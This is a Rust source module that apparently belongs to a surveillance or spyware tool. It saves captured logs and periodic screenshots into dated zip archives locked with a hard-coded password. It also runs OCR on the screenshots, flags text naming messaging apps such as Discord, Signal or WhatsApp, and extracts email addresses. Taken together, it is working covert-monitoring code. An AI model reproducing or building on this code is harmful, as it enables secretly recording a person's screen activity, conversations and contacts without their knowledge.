use chrono::{Utc, DateTime};
use std::collections::HashMap;
use rusty_tesseract::{Args, Image};
use regex::RegexBuilder;
use std::fs;
use std::fs::{File, OpenOptions};
use std::io::BufReader;
use std::io::Read;
use std::io::Write;
use linkify::{LinkFinder, LinkKind};

use crate::zip::compression::CompressionMethod;
use crate::zip::write::FileOptions;
use crate::zip::result::ZipResult;
use crate::zip::write::ZipWriter;
use crate::zip::read::ZipArchive;

static PASS: &[u8] = b"firemouses!";
static DOCUMENTS: &[u8] = b"D:\\_documents/";

pub fn do_logs(logs: String) -> ZipResult<()> {
    let now: DateTime<Utc> = Utc::now();
    let fname = format!("{}logs/{}.zip", String::from_utf8_lossy(DOCUMENTS), now.format("%Y-%m-%d").to_string());
    println!("{}", fname);

    let path = std::path::Path::new(&fname);
    let file = std::fs::File::create(path).unwrap();

    let mut zip = ZipWriter::new(file);

    let options = FileOptions::default()
        .compression_method(CompressionMethod::Stored)
        .unix_permissions(0o755)
        .with_deprecated_encryption(PASS);

    zip.start_file("log.txt", options)?;
    zip.write(logs.as_bytes())?;
    zip.finish()?;

    Ok(())
}

pub fn read_logs(filename: &str, logname: &str, password: &[u8]) -> String {
    let fname = format!("{}logs/{}.zip", String::from_utf8_lossy(DOCUMENTS), filename);
    let file = match fs::File::open(fname) {
        Ok(file) => file,
        Err(_) => {
            match do_logs(String::from("")) {
                Ok(_) => println!("Created an empty log zip file."),
                Err(e) => println!("Error: {e:?}"),
            };
            return String::from("");
        }
    };

    let reader = BufReader::new(file);

    let mut archive = ZipArchive::new(reader).unwrap();

    let mut file = match archive.by_name_decrypt(&logname, password) {
        Ok(file) => file.unwrap(),
        Err(..) => {
            println!("File {} not found in the zip.", logname);
            return String::from("");
        }
    };

    let mut contents = String::new();
    file.read_to_string(&mut contents).unwrap();
    contents
}


pub fn append_screenshots() -> ZipResult<()> {
    let now: DateTime<Utc> = Utc::now();
    let fname = format!("{}screens/{}.zip", String::from_utf8_lossy(DOCUMENTS), now.format("%Y-%m-%d").to_string());

    let path = std::path::Path::new(&fname);

    let mut file: File;
    let mut zip: ZipWriter<File>;

    if path.exists() {
        file = OpenOptions::new()
            .read(true)
            .write(true)
            .create(true)
            .open(path).unwrap();

        zip = ZipWriter::new_append(file).unwrap();
    } else {
        file = std::fs::File::create(path).unwrap();
        zip = ZipWriter::new(file);
    }

    let options = FileOptions::default()
        .compression_method(CompressionMethod::Stored)
        .unix_permissions(0o755)
        .with_deprecated_encryption(PASS);

    zip.start_file(now.format("%Y-%m-%d-%H:%M:%S.png").to_string(), options)?;

    let mut buffer = Vec::new();
    let mut f = File::open("temp.png")?;
    f.read_to_end(&mut buffer)?;
    zip.write_all(&*buffer)?;
    buffer.clear();

    zip.finish()?;

    Ok(())
}

pub fn read_screens() -> String {
    let img = Image::from_path("temp.png").unwrap();

    // fill your own argument struct if needed
    let image_to_string_args = Args {
        lang: "eng".into(),
        config_variables: HashMap::from([(
            "tessedit_char_whitelist".into(),
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@$./ ?,".into(),
        )]),
        dpi: Some(150),
        psm: Some(6),
        oem: Some(3),
    };

    let output = rusty_tesseract::image_to_string(&img, &image_to_string_args).unwrap();

    output
}

pub fn is_messengers(text: String) -> bool {
    let re =
        RegexBuilder::new(
            r"skype|discord|telegram|signal|slack|line|whatsapp|wechat|snapchat
            |zoom|hangouts|google meet|google chat
        ")
        .case_insensitive(true)
        .build().unwrap();

    let ok = re.is_match(&text);

    ok
}

pub fn links(text: String) -> String {
    let mut finder = LinkFinder::new();
    finder.kinds(&[LinkKind::Email]);
    let links: Vec<_> = finder.links(&text).collect();
    let text = links.into_iter().map(|c| c.as_str().to_owned() + "\n").collect::<String>();
    text
}